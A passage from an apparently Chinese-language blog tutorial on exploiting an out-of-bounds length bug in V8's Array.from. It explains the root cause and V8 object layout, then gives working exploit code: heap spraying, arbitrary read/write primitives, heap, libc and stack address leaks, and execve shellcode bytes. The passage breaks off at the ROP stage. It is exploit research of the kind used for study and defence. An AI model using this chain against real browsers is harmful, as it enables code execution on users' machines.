class="line">&#125;</span><br></pre></td></tr></table></figure><p>配合源码注释，可以基本了解函数流程。当然，这里还可以参考<code>polyfill</code>中的实现。</p><p>在可以迭代的情况下，会使用<code>ConstructArrayLike</code>返回一个数组<code>array</code>，用于存储迭代输出的结果。配合前文分析的<code>polyfill</code>中的实现，这里返回的数组就是<code>oobArray</code>。<br>这里也可以通过输出调试信息来进行验证<br><img src="/post/abaa2e35/print.png" alt="print.png"><br><img src="/post/abaa2e35/print2.png" alt="print2.png"></p><p>然后会进入到<code>BIND(&amp;loop)</code>块，这应该就是在使用<code>Symbol.iterator</code>在进行迭代，每次迭代所得到的值都会存入<code>array</code></p><p>迭代结束后将进入<code>&amp;loop_done</code>，这里将<code>index</code>赋值给了<code>length</code>，也就是说<code>length</code>中存储的是<code>迭代次数</code>。</p><p>最后调用了我们已经分析过的<code>GenerateSetLength</code>，三个参数分别是<code>context</code>，用于存储结果的<code>array</code>，迭代次数<code>length</code></p><h2 id="漏洞原理总结"><a href="#漏洞原理总结" class="headerlink" title="漏洞原理总结"></a>漏洞原理总结</h2><p>结合前面<code>GenerateSetLength</code>的分析，我们就可以得出整个<code>array.from</code>的处理逻辑</p><p>当在<code>Array.from</code>中迭代完成后调用了<code>GenerateSetLength</code></p><p>在<code>GenerateSetLength</code>中，若迭代次数<strong>小于</strong><code>array</code>的长度，意味着<code>array</code>的长度大于了需求的长度，那么就需要对内存进行整理，释放多余的空间。</p><blockquote><p>这里我的想法是，迭代时是按顺序依次遍历每个元素，那么<code>array</code>的前<code>length_smi</code>个元素一定是被迭代访问过的且也是仅访问过的，后面多出的元素都不是迭代得到的，所以可以去掉。</p></blockquote><p>然而开发者似乎忽略了<strong>传入的数组可以是初始数组本身</strong>的情况，从而认为数组长度应该不会小于迭代次数（因为每次迭代都会创建一个新的数组元素）</p><p>所以若数组是初始数组，那么我们就可以在迭代途中修改数组的长度。将正在迭代的数组长度缩小，那么就会导致数组多余的空间被释放，但是在<code>GenerateSetLength</code>中，又将<code>array.length</code>直接改写为较大的<code>length_smi</code>（迭代次数），导致长度属性值大于实际长度，造成越界访问。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="V8内存模型"><a href="#V8内存模型" class="headerlink" title="V8内存模型"></a>V8内存模型</h2><h3 id="Tagged-Value"><a href="#Tagged-Value" class="headerlink" title="Tagged Value"></a>Tagged Value</h3><p>在v8中，存在两种类型，一个是Smi((small integer)，一个是指针类型。由于对齐，所以指针的最低位总是0，<code>Tagged Value</code>就是利用了最低位来区别Smi和指针类型。当最低位为1时，表示这是一个指针，当最低位为0，那么这就是一个Smi。</p><ul><li>Smi<br>为了节约内存、加快运算速度等，实现了一个小整数类型，被称作Smi。<br>在32位环境中，Smi占据32位，其中最低位为标记位（为0），所以Smi只使用了31位来表示值。<br>在64位环境中，Smi占据64位，其中最低位为标记位（为0），但是只有高32位用于表示值，低32位都为0（包括标记位）</li><li>指针<br>最低位为1，在访问时需要将最低位置回0</li></ul><h3 id="JsObject"><a href="#JsObject" class="headerlink" title="JsObject"></a>JsObject</h3><p>在V8中，JavaScript对象初始结构如下所示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[ hiddenClass / map	] -&gt; ... ; 指向Map</span><br><span class="line">[ properties  		] -&gt; [empty array]</span><br><span class="line">[ elements    		] -&gt; [empty array]</span><br><span class="line">[ reserved #1 		] -\</span><br><span class="line">[ reserved #2		]  |</span><br><span class="line">[ reserved #3 		]  &#125;- in object properties,即预分配的内存空间</span><br><span class="line">...............  	   |</span><br><span class="line">[ reserved #N 		] -/</span><br></pre></td></tr></table></figure><ul><li>Map中存储了一个对象的元信息，包括对象上属性的个数，对象的大小以及指向构造函数和原型的指针等等。同时，Map中保存了Js对象的属性信息，也就是各个属性在对象中存储的偏移。然后属性的值将根据不同的类型，放在properties、element以及预留空间中。</li><li>properties指针，用于保存通过属性名作为索引的元素值，类似于字典类型</li><li>elements指针，用于保存通过整数值作为索引的元素值，类似于常规数组</li><li><p>reserved #n，为了提高访问速度，V8在对象中预分配了的一段内存区域，用来存放一些属性值（称为in-object属性），当向object中添加属性时，会先尝试将新属性放入这些预留的槽位。当in-onject槽位满后，V8才会尝试将新的属性放入properties中。</p><p><img src="/post/abaa2e35/object.png" alt="object.png"><br><img src="/post/abaa2e35/object2.png" alt="object2.png"></p></li></ul><p>当然，这里的介绍十分简略，详细细节可以参考文末给出的一些参考链接</p><h3 id="ArrayBuffer-amp-amp-TypedArray"><a href="#ArrayBuffer-amp-amp-TypedArray" class="headerlink" title="ArrayBuffer &amp;&amp; TypedArray"></a>ArrayBuffer &amp;&amp; TypedArray</h3><ul><li>ArrayBuffer<br>ArrayBuffer 对象用来表示通用的、固定长度的原始二进制数据缓冲区。ArrayBuffer 不能直接操作，而是要通过“视图”进行操作。“视图”部署了数组接口，这意味着，可以用数组的方法操作内存。</li><li>TypedArray<br>用来生成内存的视图，通过9个构造函数，可以生成9种数据格式的视图，比如Uint8Array（无符号8位整数）数组视图, Int16Array（16位整数）数组视图, Float64Array（64位浮点数）数组视图等等。</li></ul><p>简单的说，ArrayBuffer就代表一段原始的二进制数据，而TypedArray代表了一个确定的数据类型，当TypedArray与ArrayBuffer关联，就可以通过特定的数据类型格式来访问内存空间。<br>这在我们的利用中十分重要，因为这意味着我们可以在一定程度上像C语言一样直接操作内存。</p><p><strong>内存结构</strong><br><img src="/post/abaa2e35/ArrayObject.png" alt="ArrayObject.png"><br>在ArrayBuffer中存在一个BackingStore指针，这个指针指向的就是ArrayBuffer开辟的内存空间，可以使用TypedArray指定的类型读取和写入该区域，并且，这片内存区域是位于系统堆中的而不是属于GC管理的区域。<br><img src="/post/abaa2e35/ArrayObject2.png" alt="ArrayObject2.png"><br>常见利用有：</p><ol><li>可以如果修改ArrayBuffer中的Length，那么就能够造成越界访问。</li><li>如果能够修改BackingStore指针，那么就可以获得任意读写的能力了，这是非常常用的一个手段</li><li>可以通过BackingStore指针泄露堆地址，还可以在堆中布置shellcode。</li></ol><h3 id="JsFunction"><a href="#JsFunction" class="headerlink" title="JsFunction"></a>JsFunction</h3><p>在V8利用中，function也常常成为利用的一个目标。其内存结构如下：<br><img src="/post/abaa2e35/function.png" alt="function.png"><br>其中，CodeEntry是一个指向JIT代码的指针（RWX区域），如果具有任意写能力，那么可以向JIT代码处写入自己的shellcode，实现任意代码执行。<br>但是，在v8 6.7版本之后，function的code不再可写，所以不能够直接修改jit代码了。<strong>本文漏洞将不采用修改jit代码的方法</strong>。<br>（注：内存布局图是根据sakura师傅的博客重画的，但是我调试后发现，貌似函数代码指针应该在<code>kLiteralsOffset</code>的位置）<br><img src="/post/abaa2e35/function2.png" alt="function2.png"></p><h2 id="自制类型转换小工具"><a href="#自制类型转换小工具" class="headerlink" title="自制类型转换小工具"></a>自制类型转换小工具</h2><p>在v8利用中，不可避免的会读写内存。而读写内存就会使用到前文提到的<code>ArrayBuffer &amp;&amp; TypedArray</code>。在64位程序中，因为没有<code>Uint64Array</code>，所以要读写8字节的内存单元只能使用<code>Float64Array</code>（或者两个<code>Uint32</code>），但是float类型存储为小数编码，所以为了方便读写，我们需要自己实现一个Uint64与Float64之间转换的小工具</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memory</span></span>&#123;</span><br><span class="line">	<span class="keyword">constructor</span>()&#123;</span><br><span class="line">		<span class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">		<span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">		<span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">		<span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">	&#125;</span><br><span class="line">	d2u(val)&#123;		<span class="comment">//double ==&gt; Uint64</span></span><br><span class="line">		<span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line">		<span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">		<span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	u2d(val)&#123;		<span class="comment">//Uint64 ==&gt; double</span></span><br><span class="line">		<span class="keyword">let</span> tmp = [];</span><br><span class="line">		tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">		tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">		<span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> mem = <span class="keyword">new</span> Memory();</span><br></pre></td></tr></table></figure><h2 id="任意读写能力"><a href="#任意读写能力" class="headerlink" title="任意读写能力"></a>任意读写能力</h2><p>根据前文对poc的分析，可以知道，我们能够构造出一个可以越界访问的数组（属性length值 &gt; 实际长度）。<br>那么，如果可以在该数组后面内存中布置一些我们可控的对象，如ArrayBuffer，那么就可以通过修改BackingStore来实现任意读写了。<br>这里，我们还想要能够泄露任意对象的地址，可以在oobArray后布置一个普通js对象，只要将目标对象作为该对象的属性值（in-object属性），然后通过越界读取，就可以泄露出目标对象的地址了。</p><p>注意，利用过程需要使用release编译的文件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bufs = [];</span><br><span class="line"><span class="keyword">var</span> objs = [];</span><br><span class="line"><span class="keyword">var</span> oobArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray; &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> (</span><br><span class="line">	&#123;</span><br><span class="line">		counter : <span class="number">0</span>,</span><br><span class="line">		next() &#123;</span><br><span class="line">			<span class="keyword">let</span> result = <span class="number">1.1</span>;</span><br><span class="line">			<span class="keyword">this</span>.counter++;</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">				oobArray.length = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; <span class="number">100</span>;i++) &#123;</span><br><span class="line">					bufs.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1234</span>));</span><br><span class="line">					<span class="keyword">let</span> obj = &#123;<span class="string">'a'</span>: <span class="number">0x4321</span>, <span class="string">'b'</span>: <span class="number">0x9999</span>&#125;;</span><br><span class="line">					objs.push(obj);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">)&#125;);</span><br></pre></td></tr></table></figure><p>首先创建两个列表，bufs用于存储ArrayBuffer对象，objs用于存储普通Js对象</p><p>在最后一次迭代中，先将oobArray的长度缩减为1（不能为0，否则对象将被回收），然后创建100个ArrayBuffer对象和普通js对象，我们希望创建的这些对象能够有一个落在oobArray所在内存后方，能够通过越界访问控制。</p><p>然后我们就需要通过越界访问，对内存进行搜索，判断是否有我们创建的可控对象。<br>其中ArrayBuffer是通过搜索其length值0x1234（在内存中Smi表示为0x123400000000）来定位<br>普通js对象通过搜索其’a’属性的值0x4321（在内存中Smi表示为0x432100000000）来定位</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可控的buf在oobArray的第i个元素处</span></span><br><span class="line"><span class="keyword">let</span> buf_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; maxSize; i++)&#123;</span><br><span class="line">	<span class="keyword">let</span> val = mem.d2u(oobArray[i]);</span><br><span class="line">	<span class="keyword">if</span>(val === <span class="number">0x123400000000</span>)&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">"buf_offset: "</span> + i.toString());</span><br><span class="line">		buf_offset = i;</span><br><span class="line">		oobArray[i] = mem.u2d(<span class="number">0x121200000000</span>);	<span class="comment">//修改可控buf的length，做个标记</span></span><br><span class="line">		oobArray[i + <span class="number">3</span>] = mem.u2d(<span class="number">0x1212</span>);		<span class="comment">//有两处保存了length值</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可控的obj在oobArray的第i个元素处</span></span><br><span class="line"><span class="keyword">let</span> obj_offset = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; maxSize; i++)&#123;</span><br><span class="line">	<span class="keyword">let</span> val = mem.d2u(oobArray[i]);</span><br><span class="line">	<span class="keyword">if</span>(val === <span class="number">0x432100000000</span>)&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">"obj_offset: "</span> + i.toString());</span><br><span class="line">		obj_offset = i;</span><br><span class="line">		oobArray[i] = mem.u2d(<span class="number">0x567800000000</span>);	<span class="comment">//修改可控obj的属性a，做个标记</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// bufs中的第i个buf是可控的</span></span><br><span class="line"><span class="keyword">let</span> controllable_buf_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; bufs.length; i++)&#123;</span><br><span class="line">    <span class="keyword">let</span> val = bufs[i].byteLength;</span><br><span class="line">    <span class="keyword">if</span>(val === <span class="number">0x1212</span>)&#123;							<span class="comment">//查找被修改了length的buf</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"found controllable buf at idx "</span> + i.toString());</span><br><span class="line">        controllable_buf_idx = i;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// objs中第i个obj是可控的</span></span><br><span class="line"><span class="keyword">let</span> controllable_obj_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; objs.length; i++)&#123;</span><br><span class="line">	<span class="keyword">let</span> val = objs[i].a;</span><br><span class="line">	<span class="keyword">if</span>(val === <span class="number">0x5678</span>)&#123;							<span class="comment">//查找属性a被修改了的obj</span></span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">"found controllable obj at idx "</span> + i.toString());</span><br><span class="line">		controllable_obj_idx = i;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/post/abaa2e35/searchObj.png" alt="searchObj.png"><br><img src="/post/abaa2e35/searchObj2.png" alt="searchObj2.png"></p><p>这样我们就成功获得了一个可控的ArrayBuffer和一个JS对象，然后就可以写一个小工具来方便我们的任意读写了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">arbitraryRW</span></span>&#123;</span><br><span class="line">	<span class="keyword">constructor</span>(buf_offset, buf_idx, obj_offset, obj_idx)&#123;</span><br><span class="line">		<span class="keyword">this</span>.buf_offset = buf_offset;</span><br><span class="line">		<span class="keyword">this</span>.buf_idx = buf_idx;</span><br><span class="line">		<span class="keyword">this</span>.obj_offset = obj_offset;</span><br><span class="line">		<span class="keyword">this</span>.obj_idx = obj_idx;</span><br><span class="line">	&#125;</span><br><span class="line">	leak_obj(obj)&#123;</span><br><span class="line">		objs[<span class="keyword">this</span>.obj_idx].a = obj;						<span class="comment">//修改obj.a的值为目标对象</span></span><br><span class="line">		<span class="keyword">return</span> mem.d2u(oobArray[<span class="keyword">this</span>.obj_offset]) - <span class="number">1</span>;	<span class="comment">//读出属性a的值，因为oobArray是以double的格式读出，所以需要转换为Uint64</span></span><br><span class="line">	&#125;</span><br><span class="line">	read(addr)&#123;					</span><br><span class="line">		<span class="keyword">let</span> idx = <span class="keyword">this</span>.buf_offset;</span><br><span class="line">		oobArray[idx + <span class="number">1</span>] = mem.u2d(addr);				<span class="comment">//修改BackingStore指针指向目标地址</span></span><br><span class="line">		oobArray[idx + <span class="number">2</span>] = mem.u2d(addr);				<span class="comment">//修改BitField指针指向目标地址（因为调试发现该值总和BackingStore相同）</span></span><br><span class="line">		<span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(bufs[<span class="keyword">this</span>.buf_idx], <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line">		<span class="keyword">return</span> mem.d2u(tmp[<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	write(addr, val)&#123;</span><br><span class="line">		<span class="keyword">let</span> idx = <span class="keyword">this</span>.buf_offset;</span><br><span class="line">		oobArray[idx + <span class="number">1</span>] = mem.u2d(addr);</span><br><span class="line">		oobArray[idx + <span class="number">2</span>] = mem.u2d(addr);</span><br><span class="line">		<span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(bufs[<span class="keyword">this</span>.buf_idx], <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line">		tmp.set([mem.u2d(val)]);						<span class="comment">//将欲存储的Uint64值转为double形式写入</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> arw = <span class="keyword">new</span> arbitraryRW(buf_offset, controllable_buf_idx, obj_offset, controllable_obj_idx);</span><br></pre></td></tr></table></figure><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>在拥有了任意读写的能力后，其实已经可以通过改写函数jit代码来实现任意代码执行了。<br>但是我在编译完v8后发现，该版本为6.7，恰好是已经不能够修改jit代码的版本了，所以还得使用其他办法（ROP）</p><h3 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址"></a>泄露堆地址</h3><p>我们知道，BackingStore指针指向的就是系统堆的地址，只需要通过越界读取ArrayBuffer就能泄露出来</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> heap_addr = mem.d2u(oobArray[buf_offset + <span class="number">1</span>]) - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"heap_addr: 0x"</span> + heap_addr.toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure><h3 id="泄露libc基址"><a href="#泄露libc基址" class="headerlink" title="泄露libc基址"></a>泄露libc基址</h3><p>关于泄露libc的办法，我没有在网上搜到比较详细的方法（没有看懂<a href="http://eternalsakura13.com/2018/11/19/justintime/" target="_blank" rel="noopener">Sakura师傅的方法</a>）</p><p>所以我采用了一个比较暴力的办法—————搜索堆内存。</p><p>因为ctf pwn的经验，我知道在堆内存中一定存在某个堆块的fd或者bk指向libc中的地址。所以我尝试通过堆块的size和prevsize遍历堆中的chunk，搜索libc地址。</p><p>这里我认为在fd或者bk位置上的数值，只要是0x7f开头的，一定是libc中的<code>&amp;main_arena+88</code>。<br>同时，又因为libc基址是12位对齐的，所以将搜索到的地址减去固定偏移<code>0x3c4000</code>（根据libc版本而定），即可获得基址</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> curr_chunk = heap_addr;</span><br><span class="line"><span class="keyword">let</span> searched = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x5000</span>; i++)&#123;</span><br><span class="line">	<span class="keyword">let</span> size = arw.read(curr_chunk + <span class="number">0x8</span>);</span><br><span class="line">	<span class="keyword">let</span> prev_size = arw.read(curr_chunk);</span><br><span class="line">	<span class="keyword">if</span>(size !== <span class="number">0</span> &amp;&amp; size % <span class="number">2</span> === <span class="number">0</span> &amp;&amp; prev_size &lt;= <span class="number">0x3f0</span>)&#123;</span><br><span class="line">		<span class="keyword">let</span> tmp_ptr = curr_chunk - prev_size;</span><br><span class="line">		<span class="keyword">let</span> fd = arw.read(tmp_ptr + <span class="number">0x10</span>);</span><br><span class="line">		<span class="keyword">let</span> bk = arw.read(tmp_ptr + <span class="number">0x18</span>)</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">parseInt</span>(fd / <span class="number">0x10000000000</span>) === <span class="number">0x7f</span>)&#123;</span><br><span class="line">			searched = fd;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">parseInt</span>(bk / <span class="number">0x10000000000</span>) === <span class="number">0x7f</span>)&#123;</span><br><span class="line">			searched = bk;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span>(size &lt; <span class="number">0x20</span>) &#123;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	size = <span class="built_in">parseInt</span>(size / <span class="number">8</span>) * <span class="number">8</span></span><br><span class="line">	curr_chunk += size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(searched !== <span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> libc_base = <span class="built_in">parseInt</span>((searched - <span class="number">0x3c4000</span>) / <span class="number">0x1000</span>) * <span class="number">0x1000</span>;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"searched libc_base: 0x"</span> + libc_base.toString(<span class="number">16</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"Not found"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我是以事先泄露的堆地址为起点进行搜索的，所以平均情况下，实际只搜索了一半的堆内存，有一定几率没有结果。</p><h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>泄露栈地址的原因在后文会进行解释。</p><p>在libc中存在一个全局变量叫做environ，是一个指向环境变量的指针，而环境变量恰好是存储在栈上高地址的，所以可以通过这个指针泄露出栈的地址。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> environ_addr = libc_base + <span class="number">0x3C6F38</span>;</span><br><span class="line"><span class="keyword">let</span> stack_addr = arw.read(environ_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"stack_addr: 0x"</span> + stack_addr.toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure><p>注意，在使用栈地址时要适当的减一些，不要修改到了高地址的环境变量，否则容易abort。</p><h2 id="布置shellcode"><a href="#布置shellcode" class="headerlink" title="布置shellcode"></a>布置shellcode</h2><p>在成功泄露出libc基址之后，如果按照ctf中getshell的思路，其实已经可以通过将malloc_hook修改为one_gadget实现getshell。</p><p>但是，这里我们想要获得的是任意代码执行，所以还是得通过shellcode的方案。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> sc = [<span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0xbb</span>, <span class="number">0xd1</span>, <span class="number">0x9d</span>, <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0xd0</span>, <span class="number">0x8c</span>, <span class="number">0x97</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0xf7</span>, <span class="number">0xdb</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x5f</span>, <span class="number">0x99</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x54</span>, <span class="number">0x5e</span>, <span class="number">0xb0</span>, <span class="number">0x3b</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>];</span><br><span class="line"><span class="keyword">let</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">2048</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc.length; i++)&#123;</span><br><span class="line">	shellcode[i] = sc[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_addr = arw.read(arw.leak_obj(shellcode) + <span class="number">0x68</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"shell_addr: 0x"</span> + shell_addr.toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure><p>这里我将shellcode全部写入了一个ArrayBuffer中，然后泄露出了shellcode的地址</p><h2 id="ROP"><a href="#ROP" class="headerlink" 